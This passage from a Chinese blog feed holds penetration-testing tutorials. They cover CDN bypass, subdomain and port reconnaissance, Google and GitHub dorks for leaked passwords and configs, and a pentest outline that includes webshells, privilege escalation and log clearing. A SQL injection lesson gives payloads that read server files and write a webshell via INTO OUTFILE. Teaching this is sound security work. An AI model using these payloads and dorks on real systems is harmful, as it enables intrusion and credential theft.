src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626854226_60f7d352328a487812b10.jpg!small" alt="image"></p><h4 id="如何判断是否使用CDN"><a href="#如何判断是否使用CDN" class="headerlink" title="如何判断是否使用CDN"></a>如何判断是否使用CDN</h4><p><strong>1、ping目标主域</strong></p><p>通过ping目标主域，观察域名解析情况来判断是否使用CDN。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626854259_60f7d373c2e2043b305a4.png!small" alt="image"></p><p>发现使用了CDN。</p><p><strong>2、Nslookup</strong></p><p>不同DNS解析结果若不一样，很有可能存在CDN服务。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626854314_60f7d3aa3cfa4fe1eaacc.png!small" alt="image"></p><p><strong>3、ping检测平台</strong></p><p>Ping检测-站长工具<br>地址：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><h3 id="绕过CDN常见方法"><a href="#绕过CDN常见方法" class="headerlink" title="绕过CDN常见方法"></a>绕过CDN常见方法</h3><p><strong>1、ping主域</strong></p><p>有的网站只让www域名使用CDN,可以去掉www在ping下。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626854425_60f7d4197d4882c5f5035.png!small" alt="image"></p><p><strong>2、DNS历史查找</strong></p><p>CDN可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实IP。以下介绍几个平台<br><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626854474_60f7d44a668edee7b241b.png" alt="img"></p><p><a href="https://viewdns.info/">https://viewdns.info/</a></p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p><strong>3、查询子域名方法</strong></p><p>一般都是主站加入CDN，子域名站点很多没有加入，可以通过子域名来获取，下边有收集子域名详细介绍，在这里举例一个。</p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855141_60f7d6e5da4b275e0d4c8.png!small" alt="image"></p><p><strong>4、网站邮件头信息</strong></p><p>比如说，邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。<br>注意：必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的。</p><p><strong>5、网络空间搜索引擎法</strong></p><p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p><p>钟馗之眼：<a href="https://www.zoomeye.org/">https://www.zoomeye.org</a><br>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io</a><br>Fofa：<a href="https://fofa.so/">https://fofa.so</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855256_60f7d7586a674c5c8a69e.png!small" alt="image"></p><p><strong>6、网站漏洞查找</strong></p><p>通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。</p><h3 id="收集子域名"><a href="#收集子域名" class="headerlink" title="收集子域名"></a>收集子域名</h3><p>之前已经获取地址和姓名了，那就让我们大声把爱说出来。万一和心上人表白失败了，我们不要放弃，毕竟这样不容得到的男人才香啊，之前了解他的工作单位了或者家庭地址了，我们可以从他的同事或者邻居入手，通常这样更容易获取汉子的信息，方便更加深入的了解他。说不定能从同事或者邻居那边美言下，拿下这个高冷的男人了。</p><h4 id="在线平台"><a href="#在线平台" class="headerlink" title="在线平台"></a>在线平台</h4><p><strong>1、IP138</strong></p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855357_60f7d7bd415f076d0bc9e.png!small" alt="image"></p><p><strong>2、站长工具</strong></p><p><a href="http://tool.chinaz.com/subdomain/?domain=">http://tool.chinaz.com/subdomain/?domain=</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855423_60f7d7ff14510c5925afd.png!small" alt="image"></p><p><strong>3、hackertarget</strong></p><p><a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855469_60f7d82ded78ec1a4cc46.png!small" alt="image"></p><p><strong>4、phpinfo</strong></p><p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855670_60f7d8f6d5bafc69f5c34.png!small" alt="image"></p><p><strong>5、dnsdumpster</strong></p><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p><strong>6、zcjun</strong></p><p><a href="http://z.zcjun.com/">http://z.zcjun.com/</a></p><p><strong>7、Censys</strong></p><p><a href="https://censys.io/certificates?q=">https://censys.io/certificates?q=</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855796_60f7d97461a72878aa925.png!small" alt="image"></p><h3 id="IP反查绑定域名网站"><a href="#IP反查绑定域名网站" class="headerlink" title="IP反查绑定域名网站"></a>IP反查绑定域名网站</h3><p><strong>1、chinaz</strong></p><p><a href="http://s.tool.chinaz.com/same?s=">http://s.tool.chinaz.com/same?s=</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855849_60f7d9a9f0298666fdcbc.png!small" alt="image"></p><p><strong>2、爱站</strong></p><p><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></p><p><strong>3、webscan.cc</strong></p><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626855945_60f7da09b98012591f41a.png!small" alt="image"></p><h4 id="资产搜索引擎"><a href="#资产搜索引擎" class="headerlink" title="资产搜索引擎"></a>资产搜索引擎</h4><p>个人常用的有Google、FOFA，也可以使用Shodan、zoomeye钟馗之眼.</p><p><strong>1、Google语法</strong></p><p>常用语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">site ：指定搜索域名 例如：site:baidu.com</span><br><span class="line">inurl : 指定url中是否存在某些关键字 例如： inurl:.php?id=</span><br><span class="line">intext :  指定网页中是否存在某些关键字 例如：intext:网站管理</span><br><span class="line">filetype : 指定搜索文件类型 例如：filetype:txt</span><br><span class="line">intitle :  指定网页标题是否存在某些关键字 例如：intitle:后台管理</span><br><span class="line">link : 指定网页链接 例如：link:baidu.com 指定与百度做了外链的站点</span><br><span class="line">info : 指定搜索网页信息 info:baidu.com</span><br></pre></td></tr></table></figure><p><strong>2、FOFA语法</strong></p><p>可以在首页点击查询语法来查看</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856030_60f7da5e30031ba58abb7.png!small" alt="image"></p><h4 id="工具枚举"><a href="#工具枚举" class="headerlink" title="工具枚举"></a>工具枚举</h4><p>在这里常用的sublist3r、OneForAll、subDomainsBrute.</p><p><strong>1、sublist3r</strong></p><p>下载地址:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856079_60f7da8fc66d43fe60b08.png!small" alt="image"></p><p><strong>2、OneForAll</strong></p><p><code>下载地址：https://github.com/shmilylty/OneForAll</code><br>运行完成后会生成一个csv文件</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856127_60f7dabfee7e5fcdf3423.png!small" alt="image"></p><p><strong>3、subDomainsBrute</strong></p><p>下载地址：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856186_60f7dafac822eb0bec63f.png!small" alt="image"></p><h4 id="利用DNS收集"><a href="#利用DNS收集" class="headerlink" title="利用DNS收集"></a>利用DNS收集</h4><p>常见的DNS记录有以下几类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A记录       IP地址记录,记录一个域名对应的IP地址</span><br><span class="line">AAAA记录    IPv6地址记录，记录一个域名对应的IPv6地址</span><br><span class="line">CNAME记录   别名记录，记录一个主机的别名</span><br><span class="line">MX记录      电子邮件交换记录，记录一个邮件域名对应的IP地址</span><br><span class="line">NS记录      域名服务器记录 ,记录该域名由哪台域名服务器解析</span><br><span class="line">PTR记录     反向记录，也即从IP地址到域名的一条记录</span><br><span class="line">TXT记录     记录域名的相关文本信息</span><br></pre></td></tr></table></figure><p>MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856259_60f7db43a025033b6ff4b.png!small" alt="image"></p><p>NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856301_60f7db6db1607d6fe3316.png!small" alt="image"></p><p>SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856429_60f7dbed5a317277b899c.png!small" alt="image"></p><p>TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录。</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856487_60f7dc2717b6258e5e91d.png!small" alt="image"></p><p><strong>DNS域传送漏洞</strong></p><p>1、原理：DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p><p>若DNS服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。同时，黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，绕过基于网络的访问控制。<br>2、DNS域传送漏洞检测<br>基本过程</p><ol><li>nslookup #进入交互式shell</li><li>server dns.xx.yy.zz #设定查询将要使用的DNS服务器</li><li>ls xx.yy.zz #列出某个域中的所有域名</li><li>exit #退出<br>漏洞检测-不存在漏洞</li></ol><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856518_60f7dc466e23445e35da0.png!small" alt="image"></p><h3 id="站点信息收集"><a href="#站点信息收集" class="headerlink" title="站点信息收集"></a>站点信息收集</h3><p>乖乖，现在撩汉子容易吗，咱们接下来在了解下他的爱好，喜欢健身还是喜欢去娱乐场所还是宅在家里，出去玩的话都去哪里玩，喜欢吃什么等等。为咱们下一步攻势做好准备，就不信俘获不到小哥哥的芳心。</p><h4 id="判断对方是win还是Linux"><a href="#判断对方是win还是Linux" class="headerlink" title="判断对方是win还是Linux"></a>判断对方是win还是Linux</h4><p><strong>1、TTL值</strong></p><p>可以通过ping来查看，不过不一定非常准可以被修改，默认Linux是64，win是128<br>win：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856674_60f7dce23c32353ebfceb.png!small" alt="image"></p><p>Linux：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856748_60f7dd2c0319f09f29e84.png" alt="img"></p><p><strong>2、Nmap</strong></p><p>使用命令：<br>nmap -O IP</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856794_60f7dd5aded19374af4bf.png!small" alt="image"></p><h4 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h4><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 1-65535 IP  # ping目标有回复时</span><br><span class="line">nmap -sV -p 1-65535 -Pn IP  # ping目标没有回复时</span><br></pre></td></tr></table></figure><h4 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h4><p>CMS（内容管理系统）用于网站内容管理，通过识别CMS类型可以查看相应的漏洞拿下站点。<br>如今，网上一些在线的网站查询CMS指纹识别，如下所示：<br>BugScaner: <a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>潮汐指纹：<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a><br>云悉：<a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a><br>WhatWeb: <a href="https://whatweb.net/">https://whatweb.net/</a><br>云悉指纹: <a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br>WhatWeb: <a href="https://whatweb.net/">https://whatweb.net/</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856897_60f7ddc153879123bc39e.png!small" alt="image"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><strong>1、御剑扫描</strong></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856926_60f7dddec9222824ea6c5.png!small" alt="image"></p><p><strong>2、dirbuster</strong></p><p>首先在Target URL输入框中输入要扫描的网址并将扫描过程中的请求方法设置为“Auto Switch(HEAD and GET)”。<br>自行设置线程（太大了容易造成系统死机哦）<br>选择扫描类型，如果使用个人字典扫描，则选择“List based bruteforce”选项。<br>单击“Browse”加载字典。<br>单机“URL Fuzz”，选择URL模糊测试（不选择该选项则使用标准模式）<br>在URL to fuzz里输入“/{dir}”。这里的{dir}是一个变量，用来代表字典中的每一行，运行时{dir}会被字典中的目录替换掉。<br>点击“start”开始扫描</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626856968_60f7de086e726508c8cdb.png!small" alt="image"></p><p>也可以使用kali自带的</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626857001_60f7de29e1a0c3f64651c.png!small" alt="image"></p><p><strong>3、dirscan</strong></p><p>下载地址：<a href="https://github.com/j3ers3/Dirscan">https://github.com/j3ers3/Dirscan</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626857035_60f7de4b04bb9edb88e1c.png!small" alt="image"></p><p><strong>4、dirsearch</strong></p><p>下载地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1626857070_60f7de6ee0ea930f19110.png!small" alt="image"></p><h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><p>他基本语法上边有介绍，介绍下典型用法：</p><p>查找指定后台地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class="line"></span><br><span class="line">site:xx.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class="line"></span><br><span class="line">site:xx.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br></pre></td></tr></table></figure><p>查看指定网站的文件上传漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com inurl:file</span><br><span class="line"></span><br><span class="line">site:xx.com inurl:load</span><br><span class="line"></span><br><span class="line">site:xx.com inurl:upload</span><br></pre></td></tr></table></figure><p>注入页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com inurl:php?id=</span><br></pre></td></tr></table></figure><p>目录遍历漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com intitle:index.of</span><br></pre></td></tr></table></figure><p>SQL错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:”Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure><p>phpinfo()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure><p>配置文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure><p>数据库文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure><p>日志文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com ext:.log</span><br></pre></td></tr></table></figure><p>备份和历史文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure><p>公开文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure><p>邮箱信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com intext:@xx.com</span><br><span class="line">site:xx.com 邮件</span><br><span class="line">site:xx.com email</span><br></pre></td></tr></table></figure><p>社工信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xx.com intitle:账号 | 密码 | 工号 | 学号</span><br></pre></td></tr></table></figure><p>通过用户的一些信息（Mail、Name、ID、Tel）查询用户注册过哪些应用<br><a href="https://www.reg007.com/">https://www.reg007.com/</a></p><h3 id="Github信息泄漏"><a href="#Github信息泄漏" class="headerlink" title="Github信息泄漏"></a>Github信息泄漏</h3><p>很多网站及系统都会使用pop3和smtp发送来邮件，不少开发者由于安全意识不足会把相关的配置文件信息也放到Github上，所以如果这时候我们动用一下Google搜索语法，就能把这些敏感信息给找出来了。</p><p>site:Github.com smtp<br>site:Github.com smtp @qq.com<br>site:Github.com smtp @126.com<br>site:Github.com smtp @163.com<br>site:Github.com smtp @sina.com.cn</p><p>数据库信息泄露：</p><p>site:Github.com sa password<br>site:Github.com root password</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要想拿下小哥哥当然要一步步来，前边的信息收集工作是非常重要的。从开始的选择目标，到获取简单的个人信息，如何看对方是否欺骗自己，再到如果拒绝失败从他身边的人下手。可以说能否追求成功这个收集工作起到至关重要的位置。<br>主要是用来新手之间互相交流下经验，老司机可以继续开车了。</p><p>参考文档：</p><p><a href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4012739?fr=aladdin">https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4012739?fr=aladdin</a></p><p><a href="https://blog.csdn.net/lowhacker/article/details/89449701">https://blog.csdn.net/lowhacker/article/details/89449701</a></p><p><a href="https://www.freebuf.com/articles/web/281641.html">https://www.freebuf.com/articles/web/281641.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Web渗透详细过程之信息收集篇&quot;&gt;&lt;a href=&quot;#Web渗透详细过程之信息收集篇&quot; class=&quot;headerlink&quot; title=&quot;Web渗透详细过程之信息收集篇&quot;&gt;&lt;/a&gt;Web渗透详细过程之信息收集篇&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透测试基本思路</title>
    <link href="http://example.com/2021/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"/>
    <id>http://example.com/2021/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/</id>
    <published>2021-08-05T07:12:05.000Z</published>
    <updated>2021-08-15T12:54:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>​         有人问我，渗透到底做啥，web渗透到底是干什么，当你拿到一个待检测得站或网站，需要做什么。以我得经验其实web渗透是一个非常简单得事情。今天我就以个人经验来谈一谈怎么去渗透一个网站。</p><hr><p><strong>一、信息收集</strong></p><ol><li>获取域名的 whois 信息,获取注册者邮箱姓名电话等。</li><li>通过站长之家、明小子、k8 等查询服务器旁站以及子域名站点，因为主站一般比较难， 所以先看看旁站有没有通用性的 cms 或者其他漏洞。</li><li>通过 DNS 域传送漏洞、备份号查询、SSl 证书、APP、微信公众号、暴力破解、DNS 历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业域名与 ip。</li><li>通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞</li><li>通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php 探针、管理员备份文件。</li><li>google hack 进一步探测网站的信息，后台，敏感文件</li><li>敏感信息收集，如 github 源码、用 7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store 源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟馗之眼、天眼查、威胁情报、微步在线等</li><li>通过Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns 记录</li></ol><p><strong>二、漏洞扫描</strong></p><ol><li>用 AWVS、APPSCAN、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 XSS,XSRF,sql 注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</li><li>用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行测试，如ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。</li><li>漏洞利用 </li></ol><p>​       利用以上的方式拿到 webshell，或者其他权限</p><p>   4.权限提升</p><p>​      提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞， 如 iis6,pr,巴西烤   肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权</p><p>   5.日志清理</p><p>​      操作系统、中间件、数据库等日志进行清除</p><p>   6.总结报告及修复方案</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​         有人问我，渗透到底做啥，web渗透到底是干什么，当你拿到一个待检测得站或网站，需要做什么。以我得经验其实web渗透是一个非常简单得事情。今天我就以个人经验来谈一谈怎么去渗透一个网站。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;一、信息收集&lt;/strong&gt;</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="漏洞扫描" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>SQL手工注入入门教程</title>
    <link href="http://example.com/2021/08/03/%E6%B8%97%E9%80%8F%E7%AC%AC%E4%B8%80%E8%AF%BE/"/>
    <id>http://example.com/2021/08/03/%E6%B8%97%E9%80%8F%E7%AC%AC%E4%B8%80%E8%AF%BE/</id>
    <published>2021-08-03T09:11:01.000Z</published>
    <updated>2021-08-15T12:54:34.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="mysql基本hack函数："><a href="#mysql基本hack函数：" class="headerlink" title="mysql基本hack函数："></a>mysql基本hack函数：</h3><p>mid</p><p>SELECT MID(ColumnName, Start [, Length]) FROM TableName</p><p>LEFT(str,len)</p><p>返回字符串str的最左面len个字符</p><p>ASCII(str) =ORD</p><p>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</p><p>SUBSTR(str,pos,len)</p><p>从str中多少个字符开始，截取多少位</p><p>CAST</p><p>SELECT CAST(’12’ AS int)   将目标str转化为目标数据类型</p><p>IFNULL(expr1,expr2)</p><p>如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2</p><p>updatexml() extracavalue()</p><p><strong>判断字符的一些语句：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">▲left(database(),1)&gt;’s’ //left()函数</span><br><span class="line"></span><br><span class="line">Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">▲ascii(substr((select table_name from information_schema.tables where table_schema =database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数</span><br><span class="line"></span><br><span class="line">Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值</span><br><span class="line"></span><br><span class="line">▲ascii(substr((select database()),1,1))=98</span><br><span class="line"></span><br><span class="line">▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数，MID()函数</span><br><span class="line"></span><br><span class="line">Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</span><br><span class="line"></span><br><span class="line">Ord()函数同 ascii()，将字符转为 ascii 值</span><br></pre></td></tr></table></figure><h3 id="LOAD-FILE"><a href="#LOAD-FILE" class="headerlink" title="LOAD_FILE"></a>LOAD_FILE</h3><p>加载本地文件（服务器上）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br></pre></td></tr></table></figure><p>说明：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</span><br></pre></td></tr></table></figure><p>说明：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”</p><p>select load_file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’) into outfile‘c:\wamp\www\test.php’</p><p>可以将其他路径的文件导到web目录来供访问，一般用于把包含一句话木马的文件导出成php来链接</p><h3 id="get与post请求注释符的区别"><a href="#get与post请求注释符的区别" class="headerlink" title="get与post请求注释符的区别"></a>get与post请求注释符的区别</h3><p>一般很容易在各种教程上看到 ‘ or and 1=1 #  或 ‘ or and 1=1 –+</p><p>但可能没人告诉你什么情况下该用什么。</p><p>#是sql语句中的注释符，+ 在http请求中表示空格，但get与post中，由于http请求的转义，请求到后端sql语句拼接的时候可能会不一样。</p><p><strong>get请求的时候一般用:</strong></p><p>1′ and 1=1 –+</p><p>//这里最后的空格用+，在请求的时候不会被urlencode，到后端sql语句中就会成为一个正常的空格，– 后面的语句就会被注释。</p><p>但是如果在post里最后用加号的话就会被urlencode成%2B，实际的空格被转义才被转义成+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%27+or+1%3D1+--%2B&amp;passwd=111&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>post请求的时候一般用：</p><p>这时候，在post的情况下，最后一个空格，可以直接用空格，不用+来代替，因为post参数 空格会自动转成+；</p><p>而之所以不在get注入的时候使用“#”来注释，是因为，请求时，“#”不会被urlencode为“%23”，被识别为锚链接，无法传递至sql语句中。</p><p>找一个库中有哪些表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 